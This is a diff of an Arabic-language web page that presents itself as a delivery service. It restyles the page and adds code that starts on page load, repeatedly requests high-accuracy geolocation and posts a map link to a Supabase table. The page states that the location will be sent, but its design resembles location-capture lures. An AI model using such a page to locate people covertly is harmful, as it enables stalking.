@@ -8,109 +8,173 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
   <style>
+    :root {
+      --bg-1: #0f172a;
+      --bg-2: #111827;
+      --card: #ffffff;
+      --text: #0f172a;
+      --muted: #64748b;
+      --line: #e2e8f0;
+      --primary: #2563eb;
+      --primary-2: #06b6d4;
+      --success: #16a34a;
+      --wa: #22c55e;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
+      min-height: 100vh;
       font-family: "Segoe UI", Tahoma, sans-serif;
-      background: #f3f4f6;
+      background: radial-gradient(1200px 600px at 20% -10%, #1d4ed8 0%, transparent 60%),
+                  radial-gradient(1000px 500px at 100% 0%, #0891b2 0%, transparent 55%),
+                  linear-gradient(135deg, var(--bg-1), var(--bg-2));
       display: flex;
+      align-items: center;
       justify-content: center;
-      padding: 20px;
+      padding: 18px;
     }
 
     .container {
-      background: #ffffff;
+      background: var(--card);
       width: 100%;
-      max-width: 480px;
-      border-radius: 18px;
+      max-width: 460px;
+      border-radius: 24px;
       overflow: hidden;
-      box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+      border: 1px solid rgba(255,255,255,0.35);
+      box-shadow: 0 24px 60px rgba(2, 6, 23, 0.45);
     }
 
     .header {
-      background: linear-gradient(135deg, #0077ff, #00b4d8);
-      padding: 20px;
+      background: linear-gradient(140deg, var(--primary), var(--primary-2));
+      padding: 24px 20px 20px;
       text-align: center;
       color: #fff;
+      position: relative;
+    }
+
+    .header::after {
+      content: "";
+      position: absolute;
+      inset: auto -30% -40% -30%;
+      height: 120px;
+      background: rgba(255,255,255,0.14);
+      filter: blur(14px);
     }
 
     .header h1 {
       margin: 0;
-      font-size: 28px;
+      font-size: 30px;
       font-weight: 800;
-      color: #ffdd57;
+      color: #fef08a;
+      letter-spacing: .3px;
+      position: relative;
+      z-index: 1;
     }
 
     .header h2 {
-      margin: 5px 0 0;
-      font-size: 16px;
-      opacity: 0.9;
+      margin: 6px 0 0;
+      font-size: 15px;
+      opacity: 0.96;
+      font-weight: 600;
+      position: relative;
+      z-index: 1;
     }
 
     .banner {
-      background: #ffdd57;
-      padding: 12px;
+      background: #f8fafc;
+      border-bottom: 1px solid var(--line);
+      padding: 12px 14px;
       text-align: center;
       font-weight: 700;
-      font-size: 16px;
-      color: #333;
+      font-size: 14px;
+      color: var(--text);
     }
 
     .image-box {
-      padding: 20px;
+      padding: 10px;
       text-align: center;
-      background: #0f172a;
+      background: #0b1220;
+    }
+
+    .image-box img {
+      width: calc(100% + 30px);
+      margin: -15px;
+      border-radius: 20px;
+      display: block;
+      box-shadow: 0 10px 26px rgba(0,0,0,0.35);
     }
 
     .text {
-      padding: 18px;
+      padding: 18px 18px 10px;
       font-size: 15px;
-      color: #444;
+      color: #334155;
       line-height: 1.6;
+      text-align: center;
+      font-weight: 500;
     }
 
     .buttons {
-      padding: 18px;
+      padding: 12px 18px 18px;
       display: flex;
       flex-direction: column;
-      gap: 12px;
+      gap: 10px;
     }
 
     .btn {
-      padding: 14px;
+      border: none;
+      padding: 14px 16px;
       border-radius: 999px;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 700;
       text-align: center;
-      text-decoration: none;
-      display: block;
       cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: transform .18s ease, box-shadow .18s ease, filter .18s ease;
+      box-shadow: 0 8px 18px rgba(2, 6, 23, 0.18);
     }
 
-    .btn-location { background: #16a34a; color: #fff; }
-    .btn-whatsapp { background: #25d366; color: #fff; }
-    .btn-direct { background: #0ea5e9; color: #fff; }
+    .btn:active { transform: translateY(1px) scale(.995); }
+    .btn:hover { transform: translateY(-1px); filter: brightness(1.03); }
+
+    .btn-location { background: linear-gradient(135deg, #16a34a, #22c55e); color: #fff; }
+    .btn-whatsapp { background: linear-gradient(135deg, #16a34a, var(--wa)); color: #fff; }
+    .btn-direct { background: linear-gradient(135deg, #0284c7, #06b6d4); color: #fff; }
 
     .note {
       text-align: center;
-      padding: 10px 20px 20px;
-      font-size: 13px;
-      color: #666;
+      padding: 2px 20px 18px;
+      font-size: 12px;
+      color: var(--muted);
     }
 
     #loader {
       display: none;
-      width: 40px;
-      height: 40px;
-      border: 5px solid #ddd;
-      border-top: 5px solid #00b4d8;
+      width: 34px;
+      height: 34px;
+      border: 4px solid #dbeafe;
+      border-top: 4px solid var(--primary);
       border-radius: 50%;
-      margin: 15px auto;
-      animation: spin 1s linear infinite;
+      margin: 12px auto;
+      animation: spin .8s linear infinite;
     }
 
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 420px) {
+      .container { border-radius: 20px; }
+      .header h1 { font-size: 26px; }
+      .header h2 { font-size: 14px; }
+      .btn { font-size: 14px; padding: 13px 14px; }
     }
   </style>
 </head>
@@ -121,22 +185,22 @@
 
     <div class="header">
       <h1>خدمة التوصيل</h1>
-      <h2>اسم الكابتن : وسيم</h2>
-      <h2>نوع الدراجة : كهربائية</h2>
+      <h2>اسم الكابتن: وسيم</h2>
+      <h2>نوع الدراجة: كهربائية</h2>
     </div>
 
     <div class="banner">
-      رجاء تزويدنا بموقعك للوصول السريع
+      رجاءً زوّدنا بموقعك للوصول السريع
     </div>
 
     <div id="loader"></div>
 
     <div class="image-box">
-      <img src="cartoon Image.png" style="width:100%; border-radius:14px;">
+      <img src="cartoon Image.png">
     </div>
 
     <div class="text">
-      سيتم إرسال موقعك تلقائياً بعد الموافقة.
+      سيتم إرسال موقعك تلقائيًا بعد الموافقة.
     </div>
 
     <div class="buttons">
@@ -166,6 +230,8 @@
     const SUPABASE_URL = "https://ltjchzpzujchzwbgcgnt.supabase.co";
     const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx0amNoenB6dWpjaHp3YmdjZ250Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3OTQ0OTksImV4cCI6MjA4OTM3MDQ5OX0.AY1BQp4z8-G8aZTFdHafmWvIkpsusE1RgaUhvIlHCtU";
     const SUPABASE_TABLE = "order";
+    const GEO_OPTIONS = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
+    const REQUIRED_ACCURACY_METERS = 15;
 
     function showLoader() {
       document.getElementById("loader").style.display = "block";
@@ -175,10 +241,28 @@
       document.getElementById("loader").style.display = "none";
     }
 
-    // 🔥 تشغيل تلقائي
+    // تشغيل تلقائي
     window.onload = function () {
       checkPermissionAndSend();
     };
+
+    function getPositionOnce() {
+      return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, GEO_OPTIONS);
+      });
+    }
+
+    async function getBestPosition(maxAttempts = 5) {
+      let best = null;
+      for (let i = 0; i < maxAttempts; i++) {
+        const pos = await getPositionOnce();
+        if (!best || pos.coords.accuracy < best.coords.accuracy) {
+          best = pos;
+        }
+        if (best.coords.accuracy <= REQUIRED_ACCURACY_METERS) break;
+      }
+      return best;
+    }
 
     function checkPermissionAndSend() {
       showLoader();
@@ -200,20 +284,28 @@
             },
             function () {
               hideLoader();
-            }
+            },
+            GEO_OPTIONS
           );
 
         } else {
           hideLoader();
         }
 
+      }).catch(function () {
+        sendNow();
       });
     }
 
-    function sendNow(position) {
+    async function sendNow(position) {
       if (!position) {
-        navigator.geolocation.getCurrentPosition(sendNow);
-        return;
+        try {
+          position = await getBestPosition(5);
+        } catch (_) {
+          hideLoader();
+          alert("تعذر تحديد الموقع. تأكد من تفعيل GPS ومنح الإذن.");
+          return;
+        }
       }
       if (!SUPABASE_ANON_KEY || SUPABASE_ANON_KEY === "PUT_YOUR_SUPABASE_ANON_KEY_HERE") {
         hideLoader();
@@ -236,11 +328,18 @@
         body: JSON.stringify({
           Url: mapLink
         })
-      }).then(() => {
+      }).then(async (response) => {
+        if (!response.ok) {
+          const errorText = await response.text();
+          throw new Error(`HTTP ${response.status}: ${errorText}`);
+        }
         hideLoader();
-        alert("تم إرسال موقعك ✔");
-      }).catch(() => {
+        const accuracy = Math.round(position.coords.accuracy || 0);
+        alert(`تم إرسال موقعك ✔ (الدقة ~ ${accuracy}m)`);
+      }).catch((error) => {
         hideLoader();
+        alert("فشل الإرسال: " + error.message);
+        console.error(error);
       });
     }
 
@@ -262,3 +361,4 @@
 
 </body>
 </html>
+
